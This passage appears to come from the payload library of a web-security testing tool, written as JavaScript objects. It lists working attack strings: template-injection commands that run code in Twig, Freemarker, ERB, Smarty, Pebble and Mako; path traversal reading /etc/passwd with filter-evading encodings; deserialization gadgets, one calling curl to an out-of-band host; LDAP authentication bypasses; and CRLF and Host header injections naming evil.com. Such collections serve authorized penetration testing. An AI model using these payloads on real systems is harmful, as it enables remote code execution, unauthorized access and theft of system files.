      { payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", type: "ssti", subtype: "twig-rce", description: "Twig < 1.20: RCE via registerUndefinedFilterCallback", context: "twig", waf_bypass: false, encoding: "none" },
      { payload: "{{['id']|filter('system')}}", type: "ssti", subtype: "twig-rce", description: "Twig 3.x: RCE via filter function", context: "twig", waf_bypass: false, encoding: "none" },

      // Freemarker (Java)
      { payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", type: "ssti", subtype: "freemarker-rce", description: "Freemarker: RCE via Execute utility", context: "freemarker", waf_bypass: false, encoding: "none" },
      { payload: "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", type: "ssti", subtype: "freemarker-rce", description: "Freemarker: RCE short form", context: "freemarker", waf_bypass: false, encoding: "none" },

      // ERB (Ruby)
      { payload: "<%= system('id') %>", type: "ssti", subtype: "erb-rce", description: "Ruby ERB: RCE via system()", context: "erb", waf_bypass: false, encoding: "none" },
      { payload: "<%= `id` %>", type: "ssti", subtype: "erb-rce", description: "Ruby ERB: RCE via backticks", context: "erb", waf_bypass: false, encoding: "none" },

      // Smarty (PHP)
      { payload: "{system('id')}", type: "ssti", subtype: "smarty-rce", description: "Smarty: RCE via system function", context: "smarty", waf_bypass: false, encoding: "none" },

      // Pebble (Java)
      { payload: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd) %}{{bytes}}", type: "ssti", subtype: "pebble-rce", description: "Pebble: RCE via Runtime reflection", context: "pebble", waf_bypass: false, encoding: "none" },

      // Mako (Python)
      { payload: "${__import__('os').popen('id').read()}", type: "ssti", subtype: "mako-rce", description: "Mako: RCE via __import__", context: "mako", waf_bypass: false, encoding: "none" },
    ]
  },

  path_traversal: {
    name: "Path Traversal",
    payloads: [
      { payload: "../../../etc/passwd", type: "traversal", subtype: "basic", description: "Basic Linux path traversal", context: "linux", waf_bypass: false, encoding: "none" },
      { payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", type: "traversal", subtype: "basic", description: "Basic Windows path traversal", context: "windows", waf_bypass: false, encoding: "none" },
      { payload: "....//....//....//etc/passwd", type: "traversal", subtype: "bypass", description: "Double dot bypass (filter removes ../)", context: "linux", waf_bypass: true, encoding: "none" },
      { payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", type: "traversal", subtype: "bypass", description: "URL-encoded traversal", context: "linux", waf_bypass: true, encoding: "url" },
      { payload: "%252e%252e%252f%252e%252e%252fetc%252fpasswd", type: "traversal", subtype: "bypass", description: "Double URL-encoded traversal", context: "linux", waf_bypass: true, encoding: "double-url" },
      { payload: "..%c0%af..%c0%af..%c0%afetc/passwd", type: "traversal", subtype: "bypass", description: "UTF-8 overlong encoding bypass", context: "linux", waf_bypass: true, encoding: "utf8-overlong" },
      { payload: "/etc/passwd%00.jpg", type: "traversal", subtype: "bypass", description: "Null byte truncation (older PHP/Java)", context: "linux", waf_bypass: true, encoding: "null-byte" },
      { payload: "..%252f..%252f..%252fetc/passwd", type: "traversal", subtype: "bypass", description: "Double-encoded forward slash", context: "linux", waf_bypass: true, encoding: "double-url" },
      { payload: "/var/www/../../etc/passwd", type: "traversal", subtype: "absolute", description: "Absolute path with traversal", context: "linux", waf_bypass: false, encoding: "none" },
    ]
  },

  deserialization: {
    name: "Deserialization",
    payloads: [
      { payload: "ysoserial CommonsCollections1 'id'", type: "deser", subtype: "java", description: "Java: ysoserial CommonsCollections1 gadget chain", context: "java", waf_bypass: false, encoding: "none" },
      { payload: "ysoserial CommonsCollections5 'curl http://BURP-COLLAB'", type: "deser", subtype: "java", description: "Java: CommonsCollections5 with OOB validation", context: "java", waf_bypass: false, encoding: "none" },
      { payload: "ysoserial Jdk7u21 'id'", type: "deser", subtype: "java", description: "Java: JDK 7u21 native gadget (no library needed)", context: "java", waf_bypass: false, encoding: "none" },
      { payload: "O:8:\"stdClass\":0:{}", type: "deser", subtype: "php", description: "PHP: basic object injection probe", context: "php", waf_bypass: false, encoding: "none" },
      { payload: "phar://uploads/avatar.phar/test.txt", type: "deser", subtype: "php-phar", description: "PHP: phar deserialization via file operation", context: "php", waf_bypass: false, encoding: "none" },
      { payload: "import pickle,os;pickle.loads(b\"cos\\nsystem\\n(S'id'\\ntR.\")", type: "deser", subtype: "python", description: "Python pickle: RCE via os.system", context: "python", waf_bypass: false, encoding: "none" },
      { payload: "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}", type: "deser", subtype: "nodejs", description: "Node.js: node-serialize RCE via IIFE", context: "nodejs", waf_bypass: false, encoding: "none" },
    ]
  },

  ldap_injection: {
    name: "LDAP Injection",
    payloads: [
      { payload: "*)(uid=*))(|(uid=*", type: "ldapi", subtype: "auth-bypass", description: "LDAP authentication bypass", context: "ldap-login", waf_bypass: false, encoding: "none" },
      { payload: "admin)(|(password=*", type: "ldapi", subtype: "auth-bypass", description: "LDAP wildcard password bypass", context: "ldap-login", waf_bypass: false, encoding: "none" },
      { payload: "*)(objectClass=*", type: "ldapi", subtype: "enum", description: "LDAP enumerate all objects", context: "ldap-search", waf_bypass: false, encoding: "none" },
      { payload: "admin)(&)", type: "ldapi", subtype: "tautology", description: "LDAP tautology via always-true filter", context: "ldap-search", waf_bypass: false, encoding: "none" },
      { payload: "*)(%26))", type: "ldapi", subtype: "bypass", description: "URL-encoded LDAP AND bypass", context: "ldap-search", waf_bypass: true, encoding: "url" },
    ]
  },

  header_injection: {
    name: "Header Injection",
    payloads: [
      { payload: "evil.com", type: "header", subtype: "host", description: "Host header injection (password reset poisoning)", context: "Host", waf_bypass: false, encoding: "none" },
      { payload: "evil.com\r\nX-Injected: true", type: "header", subtype: "crlf", description: "CRLF injection to add custom header", context: "any", waf_bypass: false, encoding: "none" },
      { payload: "127.0.0.1, evil.com", type: "header", subtype: "xff", description: "X-Forwarded-For spoofing for IP-based auth bypass", context: "X-Forwarded-For", waf_bypass: false, encoding: "none" },
      { payload: "evil.com%0d%0aSet-Cookie:%20session=hijacked", type: "header", subtype: "crlf-cookie", description: "CRLF injection to set cookie", context: "any", waf_bypass: false, encoding: "url" },
      { payload: "evil.com%0d%0a%0d%0a<script>alert(1)</script>", type: "header", subtype: "crlf-xss", description: "HTTP response splitting for XSS", context: "any", waf_bypass: false, encoding: "url" },
      { payload: "localhost", type: "header", subtype: "host-ssrf", description: "Host header for SSRF via routing", context: "Host", waf_bypass: false, encoding: "none" },
      { payload: "X-Original-URL: /admin", type: "header", subtype: "path-override", description: "Path override to bypass access controls", context: "X-Original-URL", waf_bypass: false, encoding: "none" },
      { payload: "X-Rewrite-URL: /admin", type: "header", subtype: "path-override", description: "URL rewrite to bypass access controls", context: "X-Rewrite-URL", waf_bypass: false, encoding: "none" },
    ]
  },
};
